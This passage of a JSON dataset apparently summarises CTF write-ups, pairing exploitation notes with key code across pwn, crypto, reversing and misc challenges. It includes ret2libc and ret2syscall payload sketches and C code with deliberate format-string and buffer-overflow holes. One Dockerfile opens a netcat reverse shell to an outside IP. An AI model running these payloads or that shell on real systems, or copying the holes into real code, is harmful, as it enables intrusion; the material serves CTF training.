        "key": "```python\nimport requests\n\ndef get_discord_roles(token, guild_id):\n    url = f\"https://discordapp.com/api/v6/guilds/{guild_id}/roles\"\n    headers = {\n        \"Authorization\": token\n    }\n    response = requests.get(url, headers=headers)\n    return response.json()\n\ndef get_discord_channels(token, guild_id):\n    url = f\"https://discordapp.com/api/v6/guilds/{guild_id}/channels\"\n    headers = {\n        \"Authorization\": token\n    }\n    response = requests.get(url, headers=headers)\n    return response.json()\n\n# Example usage\ntoken = \"your_discord_token_here\"\nguild_id = \"your_guild_id_here\"\n\nroles = get_discord_roles(token, guild_id)\nchannels = get_discord_channels(token, guild_id)\n\nprint(\"Roles:\", roles)\nprint(\"Channels:\", channels)\n```\n"
    },
    {
        "name": "Another ret to libc",
        "write_up": "dataset/raw/Another ret to libc.md",
        "type": "pwn",
        "competition": [
            "kksctf/2019",
            "https://ctftime.org/event/874/tasks/"
        ],
        "score": 997,
        "max_score": 1000,
        "difficulty": 0.997,
        "knowledge": [
            "In challenges involving heap-based buffer overflows and function pointer manipulation, exploiting a format string vulnerability can allow for arbitrary code execution. Specifically, when a format string vulnerability is present, an attacker can overwrite function pointers on the heap by carefully crafting the input to cause a buffer overflow. It is critical to calculate the exact number of bytes to overwrite the heap structure and then append the desired function addresses. A common strategy is to use a \"%n\" format specifier to write a certain number of bytes to a memory address, or in scenarios where direct memory address manipulation is not filtered, \"%s\" to leak memory content or addresses directly.",
            "Memory address leakage is essential for bypassing ASLR (Address Space Layout Randomization) in challenges where the memory space is randomized at each execution. This can be achieved by using format string vulnerabilities to leak addresses from the Global Offset Table (GOT). By leaking the address of a known function (e.g., `setbuf`) and calculating the offset to a target function (`system`), an attacker can precisely target functions in memory even without knowing their randomized addresses ahead of time. Tools such as readelf can be used offline to find the offsets between functions in the libc library being used.\n\nExample of leaking an address and calculating an offset:\n```python\nsetbuf = leakInt(0x0804a00c)  # Leak GOT entry of setbuf\nsystem = setbuf - 0x32f00  # Calculate address of system by subtracting offset\n```"
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\ntypedef struct {\n    char name[256];\n    int age;\n    long id;\n    int unused;\n    void (*change_name)();\n    void (*print_info)();\n} User;\n\nvoid change_user_name(User *user) {\n    char buffer[256];\n    printf(\"Enter new name: \");\n    fgets(buffer, sizeof(buffer), stdin);\n    sprintf(user->name, buffer); // Vulnerable to format string attack\n}\n\nvoid print_user_info(User *user) {\n    printf(\"User name: %s\\n\", user->name);\n}\n\nUser* create_user() {\n    User *user = (User *)malloc(sizeof(User));\n    user->change_name = change_user_name;\n    user->print_info = print_user_info;\n    return user;\n}\n\nint main() {\n    User *user = create_user();\n    user->change_name(user);\n    user->print_info(user);\n    free(user);\n    return 0;\n}\n```"
    },
    {
        "name": "Anti-Fermat",
        "write_up": "dataset/raw/Anti-Fermat.md",
        "type": "crypto",
        "competition": [
            "zer0pts/2022",
            "https://ctftime.org/event/1555/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When analyzing RSA encryption challenges where non-standard methods are used to generate the primes $p$ and $q$, an understanding of how these primes relate to each other can reveal ways to factorize $n$. In this challenge, the key insight was that $q$ is the next prime after $p \\oplus ((1<<1024)-1)$. This relationship suggested that $p$ and $q$ are very close in value, making the Fermat's factorization method viable due to the approximation $p+q \\approx 1<<1024$. Knowing how $p$ and $q$ are chosen provides a significant hint towards factorizing $n$ by approximating $p$ and $q$ using properties of $n$ and the primes' generation method, eventually leading to the decryption of $c$.",
            "In scenarios involving RSA encryption with specially crafted prime generation algorithms, it's critical to explore algebraic manipulations and properties that can approximate or directly reveal $p$ and $q$. The realization that $p - (q^((1<<1024)-1)) - 1$ and $p + q - (1<<1024)$ are the same and small provides a direct method for attacking the cipher. By performing operations or manipulations that exploit the specific relationship between $p$ and $q$, such as using Fermat's approximation under the condition that $p$ and $q$ are very near to each other, attackers can efficiently factorize $n$. This strategy bypasses the need for brute-force attacks or extensive computational resources, making it a powerful approach for solving certain RSA challenges."
        ],
        "key": "```python\nfrom Crypto.Util.number import isPrime, getStrongPrime  \nfrom gmpy import next_prime  \nfrom secret import flag\n\n# Anti-Fermat Key Generation  \np = getStrongPrime(1024)  \nq = next_prime(p ^ ((1<<1024)-1))  \nn = p * q  \ne = 65537\n\n# Encryption  \nm = int.from_bytes(flag, 'big')  \nassert m < n  \nc = pow(m, e, n)\n\nprint('n = {}'.format(hex(n)))  \nprint('c = {}'.format(hex(c)))  \n```"
    },
    {
        "name": "Anti-Libc",
        "write_up": "dataset/raw/Anti-Libc.md",
        "type": "pwn",
        "competition": [
            "BxMCTF/2023",
            "https://ctftime.org/event/2004/tasks/"
        ],
        "score": 458,
        "max_score": 458,
        "difficulty": 1.0,
        "knowledge": [
            "In scenarios where a binary is statically linked and lacks libc functions, making ret2libc infeasible, focusing on ret2syscall strategy becomes vital. The method involves crafting an exploit to execute a desired syscall; for instance, `execve(\"/bin/sh\", 0, 0)` for spawning a shell. This method requires precise manipulation of register values to set up the syscall arguments correctly. Registers RDI, RSI, and RDX need to be set to specific values (`/bin/sh` address in RDI, and 0 in both RSI and RDX) to successfully execute `execve`. Utilizing a buffer overflow to write the `/bin/sh` string to an executable segment like `.bss` and creatively using available gadgets to manipulate the values of RDI, RSI, and RDX are key steps.  \nExample payload component for setting RDI, RSI, RDX: Using a gadget `pop rsi; pop rdi; jmp ADDR` where `ADDR` performs actions that indirectly set RDX to the desired value, such as pointing RDI to a memory location containing `0x0`.",
            "When tools like `ROPgadget` or `ropper` do not yield gadgets necessary for manipulating a specific register (e.g., RAX for setting the `execve` syscall number), manually searching through the binary's disassembly might reveal usable instructions not identified by automated tools. This approach is crucial for finding ways to set up syscall numbers or other specific register values when standard gadgets are not available. Incorporating a found instruction sequence that indirectly allows setting the desired value in RAX (e.g., using `mov ebx, eax` in conjunction with a `pop rbx` to set RAX) demonstrates the importance of not solely relying on automated tools for exploit development.  \nExample payload component for setting RAX: `pop rbx; mov ebx, eax;` where RBX is set to the syscall number (`0x3b` for `execve`), and then moved to RAX."
        ],
        "key": "```c\nvoid vulnerable_function() {\n    char buffer[64];\n    read(0, buffer, 128); // Buffer overflow vulnerability\n}\n```"
    },
    {
        "name": "any second now",
        "write_up": "dataset/raw/any second now.md",
        "type": "The type of the challenge is **crypto**.",
        "competition": [
            "b01lers/2024",
            "https://ctftime.org/event/2250/tasks/"
        ],
        "score": -1,
        "max_score": 438,
        "difficulty": -1,
        "knowledge": [
            "When dealing with recursive functions that are called with the same arguments multiple times, employing memoization can dramatically improve performance by caching previously computed results. This technique is especially useful in recursive algorithms like Fibonacci sequence calculations, where the function's direct implementation leads to exponential time complexity. A practical implementation involves storing the results of each unique function call in a data structure (e.g., a list or a dictionary) and checking this cache before performing any calculations. If the result is in the cache, it is returned immediately; otherwise, the function is executed, and its result is added to the cache.\n   - Example implementation detail: Create a cache for the results using a list or dictionary. Before computing the function, check if the result is already in the cache.",
            "For extracting hidden information when it's modulated through a series of operations with predefined constants, one can reverse engineer the encoding process by carefully tracing back through the code logic. Implement the inverse operations in the same order as the original operations were applied if possible, using the constants found in the decompiled code. If direct inverse operations are impractical, as in the case of modular arithmetic used in the challenge, use a brute-force approach or employ mathematical techniques relevant to the operation (e.g., using extended Euclidean algorithm for modular inverses in certain encryptions).\n   - Example extracted information: Given a bytestring and the result of an optimized calculation `n`, the flag can be reconstructed with `flag = ''` and iteratively updating `flag` with `flag = f\"{flag}{chr(n % int(x, 16))}\"` for each `x` in the bytestring split on '0x'.\n   \n```python\n# Example memoization usage in Python for a recursive function\ndef memoize(func):\n    cache = {}\n    def memoized_func(*args):\n        if args in cache:\n            return cache[args]\n        result = func(*args)\n        cache[args] = result\n        return result\n    return memoized_func\n\n@memoize\ndef soc(a):\n    if a == 0:\n        return 0\n    elif a == 1:\n        return 1\n    else:\n        return soc(a-1) + soc(a-2)\n```"
        ],
        "key": "```c\nundefined8 main(void)\n\n{  \n ulong uVar1;  \n long in_FS_OFFSET;  \n uint local_84;  \n uint local_78 [26];  \n long local_10;  \n  \n local_10 = *(long *)(in_FS_OFFSET + 0x28);  \n local_78[0] = 0x8bf7;  \n local_78[1] = 0x8f;  \n local_78[2] = 0x425;  \n local_78[3] = 0x36d;  \n local_78[4] = 0x1c1928b;  \n local_78[5] = 0xe5;  \n local_78[6] = 0x70;  \n local_78[7] = 0x151;  \n local_78[8] = 0x425;  \n local_78[9] = 0x2f;  \n local_78[10] = 0x739f;  \n local_78[11] = 0x91;  \n local_78[12] = 0x7f;  \n local_78[13] = 0x42517;  \n local_78[14] = 0x7f;  \n local_78[15] = 0x161;  \n local_78[16] = 0xc1;  \n local_78[17] = 0xbf;  \n local_78[18] = 0x151;  \n local_78[19] = 0x425;  \n local_78[20] = 0xc1;  \n local_78[21] = 0x161;  \n local_78[22] = 0x10d;  \n local_78[23] = 0x1e7;  \n local_78[24] = 0xf5;  \n uVar1 = super_optimized_calculation(0x5a);  \n for (local_84 = 0; local_84 < 0x19; local_84 = local_84 + 1) {  \n   putc((int)(uVar1 % (ulong)local_78[(int)local_84]),stdout);  \n }  \n putc(10,stdout);  \n if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {  \n                   // WARNING: Subroutine does not return  \n   __stack_chk_fail();  \n }  \n return 0;  \n}\n```"
    },
    {
        "name": "apl",
        "write_up": "dataset/raw/apl.md",
        "type": "The type of this CTF challenge is `misc`.",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When faced with an unfamiliar or obfuscated code snippet, especially in challenges tagged with programming or scripting languages like APL, it is beneficial to utilize online interpreters or compilers specific to the language in question to execute the code and analyze its output. Useful tools for this approach include https://tryapl.org/ for APL, among others for different languages. This strategy is particularly effective in deciphering obfuscated code that represents data or strings to be converted into readable format.",
            "Converting numerical arrays into readable text or characters by interpreting them as ASCII values is a common technique used to uncover hidden messages or flags in cybersecurity challenges. The conversion process typically involves identifying an array of numerical values in the challenge (which sometimes may be hidden or encoded in an obscure manner) and then translating these values according to the ASCII standard to retrieve the plaintext message or flag."
        ],
        "key": "```apl\nmx\u21907 0\u219314 9\u2374\u2373132  \na\u2190mx[(3 3)(3 4)(1 4)(3 3)(1 7)(7 6)(7 2)(3 1)(5 6)(3 3)(5 2)(4 5)(2 7)(6 2)(2 4)(7 4)(4 5)(2 1)(6 7)(4 5)(1 9)(4 7)(3 1)(5 1)(4 5)(3 3)(6 3)(4 5)(3 1)(5 2)(1 2)(5 1)(7 8)]\n```"
    },
    {
        "name": "AppArmor2",
        "write_up": "dataset/raw/AppArmor2.md",
        "type": "The given write-up is for a **forensics** challenge.",
        "competition": [
            "Dragon/2020",
            "https://ctftime.org/event/1082/tasks/"
        ],
        "score": 421,
        "max_score": 500,
        "difficulty": 0.842,
        "knowledge": [
            "In scenarios where AppArmor or similar security mechanisms are implemented to restrict access to specific files or paths at runtime, but not during the build process of a container, it is possible to circumvent these restrictions by creating symlinks within a Docker image during its build phase. These symlinks can then be utilized to indirectly access restricted paths when the image is mounted and run. This technique exploits the behavior of Docker that resolves symlinks when mounting volumes with the `docker run -v /hostpath:/containerpath ...` command.",
            "To exfiltrate data from restricted paths in controlled environments like CTF challenges or secure containers, consider creating a Docker image that includes a symlink pointing from an allowed path to the restricted target. During the runtime, even if direct access to the target is denied, the mounted volume will follow the symlink, thus bypassing path-based access controls and enabling read access to the restricted file. This approach relies on exploiting the difference between build-time and run-time security policies and the way Docker handles symlinks during volume mounting.\n   \n   Example Dockerfile snippet showing the symlink creation:\n   ```\n   FROM ubuntu\n   RUN ln -s /target-restricted-path /accessible-path\n   ```\n   And during build and run phases, exploiting this setup to access data in the restricted `/target-restricted-path` via the symlink at `/accessible-path`."
        ],
        "key": "```dockerfile\nFROM ubuntu\nRUN apt update && apt install -y netcat-traditional\nADD rootfs /\nCMD nc 51.38.138.162 4444 -e /bin/sh\n```"
    },
    {
        "name": "Appnote",
        "write_up": "dataset/raw/Appnote.md",
        "type": "misc",
        "competition": [
            "GoogleCTF/2022",
            "https://ctftime.org/event/1641/tasks/"
        ],
        "score": 50,
        "max_score": 314,
        "difficulty": 0.1592356687898089,
        "knowledge": [
            "When dealing with ZIP archive challenges where the content does not seem to match the expected output, it's beneficial to explore the ZIP file's structure using tools like `strings`, `binwalk`, and a hex editor. This approach is useful for identifying hidden files or manipulated structures within the ZIP that are not readily extractable by standard archive managers. This strategy can reveal additional files or data that are crucial for solving the challenge.",
            "Manipulated ZIP archives can sometimes include multiple End Of Central Directory (EOCD) records to hide the presence of additional files. By understanding the ZIP file format specification, one can manually navigate to the Central Directory Structure's offsets to extract hidden information directly from the File Data. This method requires creating or modifying scripts to jump to specific positions in the archive, thereby bypassing the manipulation and extracting the hidden content. Sample approach for recovering manipulated ZIP content involves writing or using existing scripts to reconstruct a valid ZIP archive from the manipulated one, thus making the hidden files accessible. For example, a Python script that copies all desired headers to a new, valid ZIP file to extract hidden data or flags."
        ],
        "key": "```python\nimport zipfile\nimport struct\n\ndef extract_vulnerable_zip(file_path):\n    with open(file_path, 'rb') as f:\n        data = f.read()\n\n    # Find all local file headers\n    local_file_headers = []\n    offset = 0\n    while True:\n        offset = data.find(b'PK\\x03\\x04', offset)\n        if offset == -1:\n            break\n        local_file_headers.append(offset)\n        offset += 4\n\n    # Extract file data based on local file headers\n    for header_offset in local_file_headers:\n        # Read the local file header\n        local_header = data[header_offset:header_offset + 30]\n        _, _, _, _, _, _, _, _, file_name_length, extra_field_length = struct.unpack('<4s2B4HL2H', local_header[:26])\n        \n        # Calculate file name and extra field offsets\n        file_name_offset = header_offset + 30\n        extra_field_offset = file_name_offset + file_name_length\n        \n        # Extract file name\n        file_name = data[file_name_offset:file_name_offset + file_name_length]\n        \n        # Calculate file data offset\n        file_data_offset = extra_field_offset + extra_field_length\n        \n        # Find the next local file header or end of file\n        next_header_offset = data.find(b'PK\\x03\\x04', file_data_offset)\n        if next_header_offset == -1:\n            next_header_offset = len(data)\n        \n        # Extract file data\n        file_data = data[file_data_offset:next_header_offset]\n        \n        # Save the extracted file\n        with open(file_name.decode('utf-8'), 'wb') as out_file:\n            out_file.write(file_data)\n\n# Example usage\nextract_vulnerable_zip('dump.zip')\n```\n"
    },
    {
        "name": "aptenodytes-forsteri",
        "write_up": "dataset/raw/aptenodytes-forsteri.md",
        "type": "crypto",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": 183,
        "max_score": 493,
        "difficulty": 0.3711967545638945,
        "knowledge": [
            "When faced with a substitution cipher challenge, identifying the pattern of character transformation is crucial. The transformation can often be a simple operation like shifting characters by a fixed number in the alphabet. Understanding this, one can reverse-engineer the encryption to retrieve the original message. Example approach: If the encryption uses a shift of 18 positions in the alphabet, the decryption would apply the opposite: shifting 26 - 18 = 8 positions back.",
            "To automate the decryption process or analyze the encryption method in cryptographic challenges, scripting can be highly beneficial. A Python script that maps the relation between the plaintext and ciphertext alphabets can be written. This script can then be extended or modified to decrypt the given ciphertext, significantly speeding up the solving process when dealing with familiar patterns of encryption like in this substitution cipher challenge."
        ],
        "key": "```python\nflag = \"flag{ABCDEFGHIJKLMNOPQRSTUVWXYZ}\"  \nletters = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"  \nencoded = \"\"  \nfor character in flag[5:-1]:  \n   encoded+=letters[(letters.index(character)+18)%26] #encode each character  \nprint(letters)  \nprint(encoded)\n```"
    },
    {
        "name": "ArbCrypt",
        "write_up": "dataset/raw/ArbCrypt.md",
        "type": "crypto",
        "competition": [
            "Sunshine/2019",
            "https://ctftime.org/event/767/tasks/"
        ],
        "score": 200,
        "max_score": 350,
        "difficulty": 0.5714285714285714,
        "knowledge": [
            "When encountering ciphers that involve rotation or substitution, it's vital to consider common or well-known ciphers such as ROT47 or ROT13. Tools like dcode.fr can be utilized for decoding. This approach is especially useful when the ciphertext does not immediately suggest a specific encryption method. Example payload for ROT47: `~C8 =39 A?2V8 73J:C 8FG7 AF?JJC2ECP` decodes to `Org lbh pna'g fbyir guvf punyyratr!`.",
            "In challenges involving audio files or cryptic messages, where the content is not directly interpretable as text, look for patterns or identifiable schemes such as the NATO Phonetic Alphabet for initial decoding. Further transformation, such as applying a Caesar Cipher with a hinted shift (e.g., a number provided in the message), may be required to retrieve the plaintext or flag. This method highlights the importance of recognizing and decoding encoded messages through multiple layers of obfuscation. Example transformation: Hotel Kilo Charlie Golf... with a shift of 6 decodes to `bewaretheidesofmarch`."
        ],
        "key": "```python\nfrom Crypto.Cipher import AES  \nimport itertools  \nimport string  \ngoal = 'f312cf9c53af89447e652e73b9754a0c'\n//asdfasdfasdfasdf encoded using their key  \nfor combo in itertools.product(string.letters, repeat = 2):     //bash all\ncombinations of two letters (16 bit)  \n\tkey = ''.join(combo) * 8                                //AES-128 requires a 16 byte key, so hopefully the key is just 8 of the 16 bit key.  \n\tcipher = AES.new(key, AES.MODE_ECB)  \n\tmsg = cipher.encrypt('asdfasdfasdfasdf')  \n\tif msg.encode('hex') == goal:  \n\t\tprint key  \n\t\tbreak  \n```"
    },
    {
        "name": "Archimedes",
        "write_up": "dataset/raw/Archimedes.md",
        "type": "reverse",
        "competition": [
            "ASIS/2019/Quals",
            "https://ctftime.org/event/732/tasks/"
        ],
        "score": 195,
        "max_score": 500,
        "difficulty": 0.39,
        "knowledge": [
            "When dealing with puzzles requiring brute force to find numeric strings, a straightforward approach is to use a loop to iterate through potential values, convert them to strings, and check each against the puzzle's validation function. This method is particularly effective when the validation logic is known and can be executed quickly. For instance, replicating the logic of a challenge's verification function in a separate program and iterating through potential inputs to find a valid solution can efficiently crack numeric secrets. \n   - Example of iterating through potential numeric strings: \n     ```c\n     for (size_t i = 0; i < MAX_POSSIBLE_VALUE; ++i) {\n       snprintf(buf, sizeof(buf), \"%d\", (int)i);\n       if (verification_function(buf)) {\n         // Found the valid numeric string\n         break;\n       }\n     }\n     ```",
            "For vulnerabilities involving stack overflows or format string vulnerabilities where the payload needs to bypass protections like canaries, one approach is to manipulate the input mechanism (e.g., using invalid characters for `scanf`) in such a way that it bypasses the overwrite of critical security checks (such as stack canaries) but still allows for overflow or control of other vulnerable parameters. Specifically, providing an input that causes a read or parse operation to fail in a controlled fashion can allow subsequent operations to proceed unsafely, leading to potential exploitation paths.\n   - Example of using input to bypass canary checks without triggering security mechanisms: \n     ```python\n     for i in xrange(required_length):\n       sh.sendline(\"-\")  # Cause scanf to fail in a controlled manner, leaving the canary untouched\n     payload = crafted_payload_to_control_execution_flow  # including address overwrites, ROP chains, etc.\n     sh.sendline(payload)\n     ```"
        ],
        "key": "```c\n#include <stdio.h>  \n#include <stdlib.h>  \n#include <stdbool.h>\n\nbool sub_40140A(char *secret)  \n{  \n size_t v1; // r12  \n size_t v2; // r12  \n bool ret; // al  \n int v4; // [rsp+1Ch] [rbp-34h]  \n int v5; // [rsp+34h] [rbp-1Ch]  \n int v6; // [rsp+38h] [rbp-18h]  \n int sint; // [rsp+3Ch] [rbp-14h]\n\n sint = strtol(secret, 0LL, 10);  \n ret = 0;  \n if ( sint % (strlen(secret) + 2) || secret[4] != '1' )  \n   return ret;  \n v6 = sint / 100000;  \n v5 = sint % 10000;  \n if ( 10 * (sint % 10000 / 1000) + sint % 10000 % 100 / 10 - (10 * (sint /\n100000 / 1000) + sint / 100000 % 10) != 1  \n   || 10 * (v6 / 100 % 10) + v6 / 10 % 10 - 2 * (10 * (v5 % 100 / 10) + v5 %\n1000 / 100) != 8 )  \n {  \n   return ret;  \n }  \n v4 = 10 * (v5 / 100 % 10) + v5 % 10;  \n if ( (10 * (v6 % 10) + v6 / 100 % 10) / v4 != 3 || (10 * (v6 % 10) + v6 / 100\n% 10) % v4 )  \n   return ret;  \n v1 = strlen(secret) + 2;  \n v2 = (strlen(secret) + 2) * v1;  \n if ( sint % (v5 * v6) == v2 * (strlen(secret) + 2) + 6 )  \n   ret = 1;  \n return ret;  \n}\n\nchar buf[0x100];\n\nint main(int argc, char const *argv[])  \n{  \n for (size_t i = 0; i < 0x100000000; ++i)  \n {  \n   snprintf(buf, sizeof(buf), \"%d\", (int)i);  \n   if (sub_40140A(buf))  \n     puts(buf);//790317143  \n }  \n return 0;  \n}  \n```\n\n```c\n#include <stdio.h>  \n#include <dlfcn.h>  \n#include <memory.h>  \ntypedef int (*func_t)(char *);  \nchar buf[0x100];  \nchar key[0x100];\n\n//to clear the stack of verification function,  \n//because use of `strncpy` will cause uninitialized variable access (no null\nterminate)  \n//which causes unexpected results if `strcat` is called to that string later  \nvoid clear_stack()  \n{  \n\tchar buf[0x1000];  \n\tmemset(buf, 0, sizeof(buf));  \n}\n\nint main(int argc, char const *argv[])  \n{  \n\tchar* addr = *(char**)dlopen(\"./silkroad_2.elf\", RTLD_NOW | RTLD_GLOBAL);  \n\tfunc_t f = (func_t)(addr + 0x1C06);  \n\tfor (int i = 0; i < 0x3b9aca00; ++i)  \n\t{  \n\t\tsprintf(buf, \"%.9d\", i);  \n\t\tfor (int i = 0; i < 4; ++i)  \n\t\t{  \n\t\t\tkey[i] = buf[i];  \n\t\t}  \n\t\tfor (int i = 0; i < 5; ++i)  \n\t\t{  \n\t\t\tkey[6 + i] = buf[4 + i];  \n\t\t}  \n\t\tkey[4] = '1';  \n\t\tkey[5] = '1';//4,5 must be length, which is always 11  \n\t\tkey[11] = 0;  \n\t\tclear_stack();  \n\t\tif (f(key) == 1)  \n\t\t\tputs(buf);  \n\t}  \n\treturn 0;  \n}  \n```\n\n```c\nsigned __int64 __fastcall sub_1FCA(char *input)  \n{  \n int v1; // eax  \n int v2; // ST1C_4  \n unsigned __int64 v3; // rbx  \n size_t v4; // r12  \n size_t v5; // r12  \n char v6; // bl  \n int v7; // ebx  \n int v8; // ebx  \n size_t v9; // rax  \n signed __int64 result; // rax  \n signed int i; // [rsp+14h] [rbp-4Ch]  \n signed int j; // [rsp+14h] [rbp-4Ch]  \n signed int k; // [rsp+14h] [rbp-4Ch]  \n signed int l; // [rsp+14h] [rbp-4Ch]  \n char _1337[5]; // [rsp+22h] [rbp-3Eh]  \n char v16[6]; // [rsp+27h] [rbp-39h]  \n char v17[6]; // [rsp+2Dh] [rbp-33h]  \n char haystack[6]; // [rsp+33h] [rbp-2Dh]  \n char v19[15]; // [rsp+39h] [rbp-27h]  \n unsigned __int64 v20; // [rsp+48h] [rbp-18h]\n\n v20 = __readfsqword(0x28u);  \n haystack[5] = 0;  \n for ( i = 0; i <= 4; ++i )  \n   haystack[i] = input[strlen(input) - 5 + i];  \n if ( !strstr(haystack, \"1337\") )              // 14:19  \n   goto LABEL_23; //must contain 1337, and be either X1337 or 1337X  \n v1 = strtol(haystack, 0LL, 10);  \n v2 = 100 * (input[13] - '0') + 1000 * (input[6] - '0') + input[15] - '0';  \n v3 = v1;  \n v4 = strlen(input);  \n v5 = strlen(input) * v4;  \n if ( v3 % (strlen(input) * v5) != v2 )  \n   goto LABEL_23;// 1337XorX1337 % len**3 must have ten digit being 0  \n for ( j = 0; j <= 4; ++j )  \n {  \n   v16[j] = input[j];  \n   v17[j] = input[strlen(input) - 10 + j];  \n }  \n v16[5] = 0;  \n v17[5] = 0;  \n for ( k = 0; k <= 14; ++k )  \n   v19[k] = input[k];  \n v19[14] = 0;  \n for ( l = 0; l <= 3; ++l )  \n   _1337[l] = haystack[l + 1];  \n _1337[4] = 0;  \n if ( strstr(v19, _1337)  \n   && (v6 = *input, v6 == input[strlen(input) - 8])// [0] == [11]  \n   && (v7 = input[strlen(input) - 2] - 48,  \n       v8 = input[strlen(input) - 3]  \n          - 48                                 // [17] + [16] + [15] + 1 == [1]  \n          + v7,  \n       v8 + input[strlen(input) - 4] - 48 + 1 == input[1] - 48)  \n   && (v9 = strlen(input), v9 == 19 * ((unsigned __int64)(0xD79435E50D79435FLL\n* (unsigned __int128)v9 >> 64) >> 4)) )// len must == 19  \n {  \n   result = 1LL;  \n }  \n else  \n {  \nLABEL_23:  \n   result = 0xFFFFFFFFLL;  \n }  \n return result;  \n}  \n```"
    },
    {
        "name": "Arithmetic",
        "write_up": "dataset/raw/Arithmetic.md",
        "type": "This is a **pwn** challenge.",
        "competition": [
            "MidnightSun/2022/Quals",
            "https://ctftime.org/event/1474/tasks/"
        ],
        "score": -1.0,
        "max_score": 909,
        "difficulty": -1,
        "knowledge": [
            "When dealing with arithmetic operations in a scenario where the data type is specified as `uint32_t` or any other unsigned integer type, and input restrictions prevent using negative numbers, consider integer overflow vulnerability. Integer overflow occurs when the result of an arithmetic operation exceeds the maximum value the data type can hold, causing the value to wrap around. For `uint32_t`, this maximum value is \\(2^{32}-1\\). This can be manipulated by performing operations that exceed this limit, forcing the integer to overflow and wrap around to a value that might not be directly inputtable due to constraints.",
            "To exploit an integer overflow vulnerability effectively, calculate the overflow point wrapping back to zero and use it to reach the desired number. For a `uint32_t` variable, if the goal is to achieve an arithmetic result that seems impossible due to constraints on input (e.g., no negative numbers), subtract the integer representing the \"overflow\" from the desired result, then add this number to the wrapped around value. For instance, if trying to solve \\(x + 2718281828 = 42\\), calculate \\(2^{32} - 2718281828 + 42\\) to find the input that causes an overflow and achieves the desired result, considering the overflow wraps the value back to 0 at \\(2^{32}\\).\n\nExample Payload:  \nInput number: 1576685510"
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdint.h>\n\nint main() {\n    uint32_t x;\n    printf(\"Enter your number: \");\n    scanf(\"%u\", &x);\n    if (x + 2718281828 == 42) {\n        printf(\"flag: nactf{0verfl0w_1s_c00l_6e3bk1t5}\\n\");\n    } else {\n        printf(\"Try again!\\n\");\n    }\n    return 0;\n}\n```"
    },
    {
        "name": "Armoury",
        "write_up": "dataset/raw/Armoury.md",
        "type": "pwn",
        "competition": [
            "Pragyan/2019",
            "https://ctftime.org/event/755/tasks/"
        ],
        "score": 400,
        "max_score": 400,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting a format string vulnerability in a program to leak memory addresses, specific argument positions can reveal useful information. For instance, the 3rd argument (%3$p) may disclose libc addresses, the 13th argument (%13$p) can leak the canary value (protection against buffer overflow), and the 14th argument (%14$p) might reveal saved base pointer (sfp) addresses. This knowledge aids in constructing exploits by providing valuable addresses needed for bypassing security mechanisms. In scenarios employing ret2libc attacks, knowing these positions facilitates crafting payloads to gain unauthorized access or execute arbitrary code.",
            "To construct a successful ret2libc payload in a 64-bit environment with stack canaries and ASLR enabled, the exploit must include the leaked canary value to bypass stack protection, and gadgets like \"pop rdi; ret\" to control the RDI register (used for passing the first argument to functions according to the x86_64 calling convention). Additionally, calculating the base address of libc and the ELF executable from leaked addresses enables precise targeting of system() and \"/bin/sh\". This approach allows an attacker to execute a shell despite protections, by carefully aligning the ROP (Return Oriented Programming) chain to call system(\"/bin/sh\") effectively.\n\nExample payload construction for a ret2libc attack in a 64-bit environment:\n\n```python\npayload = \"A\"*24  # Buffer overflow up to the canary\npayload += p64(canary)  # Canary value leaked from the stack\npayload += \"B\"*8  # Overwrite saved RBP (Base Pointer)\npayload += p64(pop_rdi)  # Gadget to control RDI register\npayload += p64(binsh_addr)  # Address of \"/bin/sh\" in libc\npayload += p64(system_addr)  # Address of system() in libc\npayload += \"\\n\"\n```"
        ],
        "key": "```c\n#include <stdio.h>\n\nvoid giveInfo() {\n    char buffer[24];\n    printf(\"Enter the name of Rifle to get info:\\n\");\n    scanf(\"%s\", buffer);\n    printf(\"Sorry... We dont have any information about %s\\n\", buffer);\n}\n\nint main() {\n    printf(\"*******Rifle Database**************\\n\");\n    giveInfo();\n    return 0;\n}\n```"
    },
    {
        "name": "Artscii",
        "write_up": "dataset/raw/Artscii.md",
        "type": "misc",
        "competition": [
            "insomnihack/2023/Quals",
            "https://ctftime.org/event/1831/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When faced with an encoded message in a CTF challenge where the encoding involves merging lines or characters from different fonts, Python's `zip` function combined with list comprehensions can be employed to efficiently compare and merge these lines or characters. This approach is particularly useful in challenges involving visual encoding or steganography where patterns or characters need to be combined or compared line by line or character by character. This method can systematically analyze the data, significantly reducing the complexity of brute-forcing the correct pattern or character sequence.",
            "In challenges where the output is generated using a select few from a large set of possible options (e.g., fonts, characters, encryption algorithms), brute-forcing all combinations of these options is a viable strategy, especially when the number of options is relatively small (e.g., ~100 fonts). This technique is applicable when the correct combination produces a unique or identifiable output, making it possible to programmatically determine the correct choice among many. This strategy is particularly effective in scenarios where patterns, encodings, or cryptographic algorithms are employed with a limited set of keys or configurations."
        ],
        "key": "```python  \nimport re  \nimport art\n\nwith open(\"flag.txt\") as f:  \n\tflag = f.readline()  \n\tassert(flag[0:4]==\"INS{\" and flag[-1]==\"}\")  \n\tcontent = flag[4:-1]  \n\tassert(re.search(r'^[A-Z1-9_]*$', content))  \n\tassert(content.count(\"_\") == 2)  \n\tcontent = content.replace(\"_\",\"\\n\")\n\ndef mergeLines(line1,line2):  \n\tline = list(map(lambda xy: \" \" if xy[0] == xy[1] else \"#\", zip(line1, line2)))  \n\treturn ''.join(line)\n\ndef mergeText(text1, text2):  \n\ta = text1.split(\"\\n\")  \n\tb = text2.split(\"\\n\")  \n\tc = []  \n\tfor j in range(25):  \n\t\tc.append(mergeLines(a[j],b[j]))  \n\treturn '\\n'.join(c) \n\ni = 0  \nwhile i<3:  \n\ttext = art.text2art(content, font=\"rnd-medium\", chr_ignore=False)  \n\tif re.search(r'^[ #\\n]*$', text) and text.count('\\n') == 24:  \n\t\tif i == 0:  \n\t\t\tres = text  \n\t\telse:  \n\t\t\tres = mergeText(res,text)  \n\t\ti = i+1\n\nprint(res)  \n```"
